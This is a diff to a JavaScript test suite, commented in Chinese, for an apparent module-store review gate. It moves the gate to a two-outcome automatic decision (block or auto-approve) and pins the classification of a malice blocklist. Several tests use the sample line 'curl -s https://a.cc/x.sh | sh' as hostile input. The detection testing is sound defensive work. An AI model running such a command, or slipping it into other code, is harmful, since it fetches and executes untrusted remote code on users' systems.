@@ -153,7 +153,10 @@ for (const s of MALICE_SHAPES) {
     assert.deepEqual(mal.basis, ['static-malice-list']);
     const d = decide(rep.riskLevel, 'first', { revokedCount: 0 }, mal);
     assert.equal(d.action, 'block', `${s.id} 命中却不拦 = 名单失去意义`);
-    assert.equal(d.label, 'needs-human-review', '标签词汇本轮不动（§4 标签步那一行是 YAML 那一发的事）');
+    // 契约 §1.1：block 的 label 是 auto-rejected、needsHumanReview 为 false —— 去人工化之后
+    // 没有「转人工」这个去处，命中名单就是自动拒，不再挂 needs-human-review 等人来签。
+    assert.equal(d.label, 'auto-rejected', '§1.1 的 block 返回形状：label 必须是 auto-rejected');
+    assert.equal(d.needsHumanReview, false, '§1.1：block 也不再是「等人审」，机器自己拒');
     assert.equal(d.axis, 'malice');
 
     if (s.sole) {
@@ -338,6 +341,106 @@ test('老轴逐字保留：不传第四参就是今天的等级判据（YAML 接
   assert.equal(decide('low', 'first', null, null).action, 'auto-approve', '显式 null 也算「没接到判据」⇒ 老轴');
   // 读不懂等级那一格照旧保守：新轴下它仍然拦
   assert.equal(classifyMalice(null, null).malicious, true);
+  // 老轴的形状也要逐字不动（契约 §1.2）：request-review / needs-human-review / needsHumanReview:true
+  // 这三件事都还在这条分支上活着。新轴把 request-review 删干净了，但**没有**连带删老轴 ——
+  // 有人「顺手统一一下」把老轴也二值化，就会红在这里。
+  assert.deepEqual(decide('low', 'update'), {
+    action: 'request-review', label: 'needs-human-review', needsHumanReview: true,
+    reason: '静态扫描 low 风险，但这是对已收录模块的版本更新，按规则一律人工审',
+  });
+});
+
+/* ---------------------------------------------------------------------------
+ * 5.5 契约 §1.1 四支逐支钉死（去人工化那一轮的验收形状）
+ * ------------------------------------------------------------------------ */
+
+test('§1.1 四支：① 命中名单 / ② 含 unknown / ③ 撤销过 / ④ 其余一切', () => {
+  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
+  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
+  assert.equal(clean.malicious, false);
+  assert.equal(evil.malicious, true);
+
+  // ① 命中名单 ⇒ block（level 说什么都不影响）
+  for (const lv of ['low', 'medium', 'high']) {
+    const d = decide(lv, 'first', null, evil);
+    assert.equal(d.action, 'block', `① ${lv}/first 命中名单必须 block`);
+    assert.equal(d.label, 'auto-rejected');
+    assert.equal(d.needsHumanReview, false);
+    assert.equal(d.axis, 'malice');
+    assert.deepEqual([...d.basis], ['static-malice-list']);
+  }
+
+  // ② 含 unknown ⇒ block（fail-closed）
+  const d2 = decide('low', 'unknown', null, clean);
+  assert.equal(d2.action, 'block');
+  assert.equal(d2.label, 'auto-rejected');
+  assert.match(d2.reason, /按不可上架处理/);
+
+  // ③ 撤销过 ⇒ block
+  const d3 = decide('low', 'first', { revokedCount: 1, revokedEntries: ['x.sh'] }, clean);
+  assert.equal(d3.action, 'block');
+  assert.equal(d3.label, 'auto-rejected');
+  assert.match(d3.reason, /x\.sh/, 'reason 必须指名被撤销的条目，人才复验得了');
+
+  // ④ 其余一切 ⇒ auto-approve。level 三档 × changeType 两档全枚举，一支不许漏。
+  for (const lv of ['low', 'medium', 'high']) {
+    for (const ct of ['first', 'update']) {
+      const d4 = decide(lv, ct, { revokedCount: 0 }, clean);
+      assert.equal(d4.action, 'auto-approve', `④ ${lv}/${ct} 名单外必须放行`);
+      assert.equal(d4.label, 'auto-approved');
+      assert.equal(d4.needsHumanReview, false);
+      assert.equal(d4.axis, 'malice');
+      assert.match(d4.reason, /只是标注输入，不再拦上架/);
+    }
+  }
+});
+
+test('§1.1 ② 的拼接值：first+update 放行，first+unknown 拦（批量 PR 的 changeTypeOf 会产出这种值）', () => {
+  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
+  // 批量 PR 里一包首投一包更新 ⇒ 'first+update'。它不含 unknown ⇒ 走 ④ 放行。
+  // 这里钉的是「split('+') 再 includes」这个写法本身：若有人图省事写成
+  // `changeType !== 'first'` 或 `String(changeType).includes('unknown')`，
+  // 前者会把 first+update 误拦，后者看着一样但挡不住 'notunknown' 这种脏值。
+  const mix = decide('low', 'first+update', null, clean);
+  assert.equal(mix.action, 'auto-approve', 'first+update 不含 unknown ⇒ 必须放行');
+  // 拼接值里带 unknown ⇒ 真的分不清 ⇒ 拦。
+  const mixed = decide('low', 'first+unknown', null, clean);
+  assert.equal(mixed.action, 'block', 'first+unknown 含 unknown ⇒ 必须拦');
+  assert.equal(mixed.label, 'auto-rejected');
+  // 脏值：不是以 + 分隔的整词，不该被当成 unknown。
+  assert.equal(decide('low', 'notunknown', null, clean).action, 'auto-approve',
+    '判据是「split(+) 后含 unknown 这个词」，不是「字符串里含 unknown 子串」');
+});
+
+test('§1.1 取严：malice 命中时 changeType 说什么都不放行（first 与 update 一视同仁）', () => {
+  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
+  assert.equal(evil.malicious, true);
+  for (const ct of ['first', 'update', 'unknown', 'first+update']) {
+    const d = decide('low', ct, { revokedCount: 0 }, evil);
+    assert.equal(d.action, 'block', `① 优先于 ②③④：${ct} 下命中名单仍然 block`);
+    assert.equal(d.label, 'auto-rejected');
+  }
+});
+
+test('§1.1 新轴只有两个 action：全枚举跑一遍，request-review 一个都不许冒出来', () => {
+  const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
+  const evil = classifyMalice(lineHits('service.sh', body('curl -s https://a.cc/x.sh | sh')), null);
+  const seen = new Set();
+  for (const lv of ['low', 'medium', 'high']) {
+    for (const ct of ['first', 'update', 'unknown', 'first+update', 'first+unknown']) {
+      for (const cov of [null, { revokedCount: 0 }, { revokedCount: 2, revokedEntries: ['a.sh'] }]) {
+        for (const mal of [clean, evil]) {
+          const d = decide(lv, ct, cov, mal);
+          seen.add(d.action);
+          assert.ok(d.action === 'block' || d.action === 'auto-approve',
+            `新轴冒出了第三个 action：${d.action}（契约 §1.1 是二值）`);
+          assert.equal(d.label, d.action === 'block' ? 'auto-rejected' : 'auto-approved');
+          assert.equal(d.needsHumanReview, false, '新轴上 needsHumanReview 恒 false');
+        }
+      }
+    }
+  }
+  assert.deepEqual([...seen].sort(), ['auto-approve', 'block']);
 });
 
 test('fix8-E 那道闸在新轴上仍然生效（只更严不更松）', () => {
@@ -345,15 +448,29 @@ test('fix8-E 那道闸在新轴上仍然生效（只更严不更松）', () => {
   assert.equal(clean.malicious, false);
   const revoked = { revokedCount: 2, revokedEntries: ['a.sh', 'b.sh'] };
   const d = decide('high', 'first', revoked, clean);
-  assert.equal(d.action, 'request-review', '撤销过 ⇒ 机器不替它作证，这一格在换轴后仍然拦自动放行');
+  assert.equal(d.action, 'block', '撤销过 ⇒ 机器不替它作证，这一格在换轴后仍然拦自动放行');
+  // 契约 §1.1：新轴只有 block / auto-approve 两值，block 的 label 一律 auto-rejected。
+  assert.equal(d.label, 'auto-rejected');
+  assert.equal(d.needsHumanReview, false);
   assert.match(d.reason, /机器不替它作证/);
+  // 措辞纪律（任务 1 第 3 支）：改成「不予自动放行」，不再说「需人工确认」——
+  // 去人工化后没有人工确认这个去处，那句话会指向一个不存在的动作。
+  assert.match(d.reason, /不予自动放行/);
+  assert.doesNotMatch(d.reason, /需人工确认/);
 });
 
-test('update / unknown 在新轴上维持转人工：§13 第 2 条是待拍，不许落地时自行默认', () => {
+test('update / unknown 在新轴上的两支：update 放行、unknown 拦（§1.1 第 ② 支）', () => {
   const clean = classifyMalice(lineHits('service.sh', body('ui_print("x")')), null);
-  assert.equal(decide('low', 'update', null, clean).action, 'request-review');
-  assert.equal(decide('low', 'unknown', null, clean).action, 'request-review');
-  assert.match(decide('low', 'update', null, clean).reason, /待拍/);
+  // 契约 §1.1 要点：`update` 与 `first` 判据完全等价，不做跨版本差异比对（用户 Q12 口径）。
+  const up = decide('low', 'update', null, clean);
+  assert.equal(up.action, 'auto-approve', 'update 不再另开一道：与 first 同一套判据');
+  assert.match(up.reason, /版本更新与首次收录适用同一套判据/,
+    'update 的 reason 必须说出这句话 —— 旧文案「按规则需要人工审核」是假陈述');
+  // 只有真的分不清首投/更新才 fail-closed。
+  const unk = decide('low', 'unknown', null, clean);
+  assert.equal(unk.action, 'block');
+  assert.equal(unk.label, 'auto-rejected');
+  assert.match(unk.reason, /无法判定是首次收录还是版本更新/);
 });
 
 /* ---------------------------------------------------------------------------
@@ -452,12 +569,16 @@ test('报告的 Markdown 把三条标注分开写，并明写「未经人工审�
   //   ⇒ `PIPE_TO_SHELL` 在 §13.5 拍的那 11 条名单（`MALICE_RULE_IDS`）里 ⇒ `rep.malice.malicious` 恒为
   //   true ⇒ `decide()` 取的是「命中」那一支（basis 非空），呈现层念「命中上架拦截名单或 AI 恶意结论」
   //   是**对的**。本用例上面第 1 句（`恶意行为链：**命中**`）与第 2 句（md2 那句）还各自钉着这个形状
-  //   必须命中 —— 那两句不许翻。要验的这一格是「**名单外** + update ⇒ §13 第 2 条待拍 ⇒ 仍不放行」，
+  //   必须命中 —— 那两句不许翻。要验的这一格是「**名单外** + 仍不放行」那一支，
   //   所以拿本文件第 5 节同一口吻的 clean 那发（`ui_print` 一行，名单外读数）作为定性输入。
+  //
+  // ⚠ 2026-10-26 去人工化（契约 §1.1）：新轴上「名单外 + update」不再是保守分支，它变成
+  //   auto-approve —— 所以这一格改用「名单外 + unknown」来喂（② 支，唯一还会在名单外拦下的那一格）。
+  //   呈现层那句「按 §13 的待拍项 / 撤销记账维持保守分支」也因此要跟着改成说清 unknown 这一支。
   const notHit = classifyMalice(lineHits('service.sh', body('ui_print("installed")')), null);
   assert.equal(notHit.malicious, false, '反证的那一份喂料自己要先成立：它必须真·名单外，否则下面两句白测');
-  const md3 = renderMarkdown({ ...rep, decision: decide('high', 'update', { revokedCount: 0 }, notHit) });
-  assert.match(md3, /本次机器判定\*\*不上架\*\*（未命中名单，但这一档按 §13 的待拍项 \/ 撤销记账维持保守分支）。/);
+  const md3 = renderMarkdown({ ...rep, decision: decide('high', 'unknown', { revokedCount: 0 }, notHit) });
+  assert.match(md3, /本次机器判定\*\*不上架\*\*（未命中名单，但分不清首投还是更新 \/ 撤销记账维持保守分支）。/);
   assert.doesNotMatch(md3, /命中上架拦截名单或 AI 恶意结论/,
     '把没命中的模块念成命中 = 替它说一句指控，方向正好反了');
 });
